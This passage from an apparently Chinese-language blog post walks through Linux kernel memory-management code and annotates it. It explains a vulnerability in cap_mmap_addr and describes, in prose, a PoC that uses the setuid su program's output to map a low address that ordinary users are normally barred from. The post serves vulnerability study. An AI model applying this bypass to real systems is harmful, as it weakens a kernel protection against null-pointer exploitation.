class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* VM_FAULT_RETRY triggered, so seek to the faulting offset */</span></span><br><span class="line">		pages += ret;</span><br><span class="line">		start += ret &lt;&lt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Repeat on the address that fired VM_FAULT_RETRY</span></span><br><span class="line"><span class="comment">		 * without FAULT_FLAG_ALLOW_RETRY but with</span></span><br><span class="line"><span class="comment">		 * FAULT_FLAG_TRIED.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		*locked = <span class="number">1</span>;</span><br><span class="line">		lock_dropped = <span class="literal">true</span>;</span><br><span class="line">		down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">		ret = __get_user_pages(tsk, mm, start, <span class="number">1</span>, flags | FOLL_TRIED,</span><br><span class="line">				       pages, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret != <span class="number">1</span>) &#123;</span><br><span class="line">			BUG_ON(ret &gt; <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (!pages_done)</span><br><span class="line">				pages_done = ret;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		nr_pages--;</span><br><span class="line">		pages_done++;</span><br><span class="line">		<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		pages++;</span><br><span class="line">		start += PAGE_SIZE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (notify_drop &amp;&amp; lock_dropped &amp;&amp; *locked) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We must let the caller know we temporarily dropped the lock</span></span><br><span class="line"><span class="comment">		 * and so the critical section protected by it was lost.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">		*locked = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pages_done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里其实没太懂为啥两次<code>__get_user_pages</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">		struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> page_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment">	 * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment">	 * using the address space</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">		gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> foll_flags = gup_flags;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> page_increm;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line">		<span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">			vma = find_extend_vma(mm, start); <span class="comment">//查找vma</span></span><br><span class="line">			<span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line">				<span class="keyword">int</span> ret;</span><br><span class="line">				ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">						gup_flags, &amp;vma,</span><br><span class="line">						pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span> (ret)</span><br><span class="line">					<span class="keyword">return</span> i ? : ret;</span><br><span class="line">				page_mask = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line">				<span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line">			<span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">				i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">						&amp;start, &amp;nr_pages, i,</span><br><span class="line">						gup_flags);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If we have a pending SIGKILL, don't keep faulting pages and</span></span><br><span class="line"><span class="comment">		 * potentially allocating memory.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched();</span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);	<span class="comment">//从用户空间地址即start查找页面描述符</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking);</span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment">			 * struct page.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">goto</span> next_page;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line">			<span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (pages) &#123;</span><br><span class="line">			pages[i] = page;</span><br><span class="line">			flush_anon_page(vma, page, start);</span><br><span class="line">			flush_dcache_page(page);</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">next_page:</span><br><span class="line">		<span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">			vmas[i] = vma;</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line">		<span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">			page_increm = nr_pages;</span><br><span class="line">		i += page_increm;</span><br><span class="line">		start += page_increm * PAGE_SIZE;</span><br><span class="line">		nr_pages -= page_increm;</span><br><span class="line">	&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>find_extend_vma</code>函数用来查找<code>vma</code></p>
<p>似乎因为<code>CONFIG_STACK_GROWSUP</code>配置的定义与否，会用两种不同的<code>find_extend_vma</code>函数</p>
<p>这里我们所需要的函数是未定义<code>CONFIG_STACK_GROWSUP</code>配置的那个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">find_extend_vma</span>(<span class="title">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>, <span class="title">unsigned</span> <span class="title">long</span> <span class="title">addr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> start;</span><br><span class="line"></span><br><span class="line">	addr &amp;= PAGE_MASK;</span><br><span class="line">	vma = find_vma(mm, addr); <span class="comment">//查找对应的vma</span></span><br><span class="line">	<span class="keyword">if</span> (!vma)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_start &lt;= addr)</span><br><span class="line">		<span class="keyword">return</span> vma;</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	start = vma-&gt;vm_start;</span><br><span class="line">	<span class="keyword">if</span> (expand_stack(vma, addr))	<span class="comment">//走到这里是因为addr不在任何已存的vma的范围内，就需要扩展vma</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_LOCKED)</span><br><span class="line">		populate_vma_page_range(vma, addr, start, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> vma;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">expand_stack</span><span class="params">(struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">	address &amp;= PAGE_MASK;</span><br><span class="line">	prev = vma-&gt;vm_prev;</span><br><span class="line">	<span class="keyword">if</span> (prev &amp;&amp; prev-&gt;vm_end == address) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(prev-&gt;vm_flags &amp; VM_GROWSDOWN))</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> expand_downwards(vma, address);	<span class="comment">//主要是这个函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">expand_downwards</span><span class="params">(struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">vma</span>-&gt;<span class="title">vm_mm</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">	address &amp;= PAGE_MASK;</span><br><span class="line">	error = security_mmap_addr(address);	<span class="comment">//漏洞就在这个函数里面</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We must make sure the anon_vma is allocated. */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * vma-&gt;vm_start/vm_end cannot change under us because the caller</span></span><br><span class="line"><span class="comment">	 * is required to hold the mmap_sem in read mode.  We need the</span></span><br><span class="line"><span class="comment">	 * anon_vma lock to serialize against concurrent expand_stacks.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	anon_vma_lock_write(vma-&gt;anon_vma);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Somebody else might have raced and expanded it already */</span></span><br><span class="line">	<span class="keyword">if</span> (address &lt; vma-&gt;vm_start) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> size, grow;</span><br><span class="line"></span><br><span class="line">		size = vma-&gt;vm_end - address;</span><br><span class="line">		grow = (vma-&gt;vm_start - address) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">		error = -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (grow &lt;= vma-&gt;vm_pgoff) &#123;</span><br><span class="line">			error = acct_stack_growth(vma, size, grow);</span><br><span class="line">			<span class="keyword">if</span> (!error) &#123;</span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				 * vma_gap_update() doesn't support concurrent</span></span><br><span class="line"><span class="comment">				 * updates, but we only hold a shared mmap_sem</span></span><br><span class="line"><span class="comment">				 * lock here, so we need to protect against</span></span><br><span class="line"><span class="comment">				 * concurrent vma expansions.</span></span><br><span class="line"><span class="comment">				 * anon_vma_lock_write() doesn't help here, as</span></span><br><span class="line"><span class="comment">				 * we don't guarantee that all growable vmas</span></span><br><span class="line"><span class="comment">				 * in a mm share the same root anon vma.</span></span><br><span class="line"><span class="comment">				 * So, we reuse mm-&gt;page_table_lock to guard</span></span><br><span class="line"><span class="comment">				 * against concurrent vma expansions.</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				spin_lock(&amp;mm-&gt;page_table_lock);</span><br><span class="line">				<span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_LOCKED)</span><br><span class="line">					mm-&gt;locked_vm += grow;</span><br><span class="line">				vm_stat_account(mm, vma-&gt;vm_flags, grow);</span><br><span class="line">				anon_vma_interval_tree_pre_update_vma(vma);</span><br><span class="line">				vma-&gt;vm_start = address;</span><br><span class="line">				vma-&gt;vm_pgoff -= grow;</span><br><span class="line">				anon_vma_interval_tree_post_update_vma(vma);</span><br><span class="line">				vma_gap_update(vma);</span><br><span class="line">				spin_unlock(&amp;mm-&gt;page_table_lock);</span><br><span class="line"></span><br><span class="line">				perf_event_mmap(vma);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	anon_vma_unlock_write(vma-&gt;anon_vma);</span><br><span class="line">	khugepaged_enter_vma_merge(vma, vma-&gt;vm_flags);</span><br><span class="line">	validate_mm(mm);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞就在<code>security_mmap_addr</code>函数里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_mmap_addr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> cap_mmap_addr(addr); <span class="comment">//检查是否能mmap指定的addr，其实就是对addr的合法性检查</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cap_mmap_addr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr &lt; dac_mmap_min_addr) &#123;</span><br><span class="line">		ret = cap_capable(current_cred(), &amp;init_user_ns, CAP_SYS_RAWIO,</span><br><span class="line">				  SECURITY_CAP_AUDIT);  <span class="comment">//确定任务是否有特定的有效性，即确定任务是否有权限可以被执行</span></span><br><span class="line">		<span class="comment">/* set PF_SUPERPRIV if it turns out we allow the low mmap */</span></span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			current-&gt;flags |= PF_SUPERPRIV;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果按照<code>Poc</code>运行的话，由于<code>su</code>是一个<code>suid</code>程序，故在运行它的时候权限会被提到<code>su</code>的所有者即<code>root</code>权限，那么这里<code>current_cred()</code>返回的就是<code>root</code>的<code>cred</code>，所以这里的检查一定会过</p>
<p>这里的检查一过，那么我们所请求的内存空间就会被顺利的申请出来</p>
<p>所以，我们本身先设置FILE结构体中的指针指向我们所请求的对普通用户而言不合法的地址，例如0x9000，然后用su的输出来FILE进行写操作，经过一系列检查，最终申请出来vma并映射这些地址到内存，感觉上类似缺页之后分配页但实际不是</p>
<h1 id="vma"><a href="#vma" class="headerlink" title="vma"></a>vma</h1><p><code>vma</code>即<code>Virtual Memory Area</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/* The first cache line has the info for VMA tree walking. */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;		<span class="comment">/* Our start address within vm_mm. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;		<span class="comment">/* The first byte after our end address</span></span><br><span class="line"><span class="comment">					   within vm_mm. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Largest free memory gap in bytes to the left of this VMA.</span></span><br><span class="line"><span class="comment">	 * Either between this VMA and vma-&gt;vm_prev, or between one of the</span></span><br><span class="line"><span class="comment">	 * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps</span></span><br><span class="line"><span class="comment">	 * get_unmapped_area find a free area of the right size.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_gap;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Second cache line starts here. */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span>	<span class="comment">/* The address space we belong to. */</span></span><br><span class="line">	<span class="keyword">pgprot_t</span> vm_page_prot;		<span class="comment">/* Access permissions of this VMA. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;		<span class="comment">/* Flags, see mm.h. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">	 * linkage into the address_space-&gt;i_mmap interval tree.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_last;</span><br><span class="line">	&#125; shared;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A file's MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">	 * list, after a COW of one of the file pages.	A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">	 * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">	 * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_chain</span>;</span> <span class="comment">/* Serialized by mmap_sem &amp;</span></span><br><span class="line"><span class="comment">					  * page_table_lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>	<span class="comment">/* Serialized by page_table_lock */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Information about our backing store: */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;		<span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">					   units */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>		<span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">	<span class="keyword">void</span> * vm_private_data;		<span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>	<span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>	<span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span 